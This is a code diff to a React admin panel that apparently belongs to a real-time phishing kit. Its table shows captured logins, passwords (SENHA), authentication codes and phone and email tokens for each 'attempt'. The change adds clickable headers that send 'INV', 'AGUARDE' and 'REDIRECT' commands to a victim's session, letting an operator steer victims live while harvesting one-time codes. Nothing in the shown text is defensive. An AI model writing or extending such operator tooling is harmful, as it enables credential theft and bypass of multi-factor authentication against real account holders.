@@ -225,7 +225,12 @@ function AdminPanel() {
                         <tr>
                           <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">#</th>
                           <th className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">status</th>
-                          <th className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">INV</th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "INV")}
+                            className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-purple-200 transition-colors"
+                          >
+                            INV
+                          </th>
                           <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">USUÁRIO/LOGIN</th>
                           <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">SENHA</th>
                           <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">AUT</th>
@@ -233,8 +238,18 @@ function AdminPanel() {
                           <th className="bg-orange-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-TEL</th>
                           <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">Nº TELEFONE</th>
                           <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-MAIL</th>
-                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">👍</th>
-                          <th className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">X</th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "AGUARDE")}
+                            className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-yellow-200 transition-colors"
+                          >
+                            👍
+                          </th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "REDIRECT")}
+                            className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-pink-200 transition-colors"
+                          >
+                            X
+                          </th>
                           <th className="bg-gray-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">🗑️</th>
                         </tr>
                       </thead>
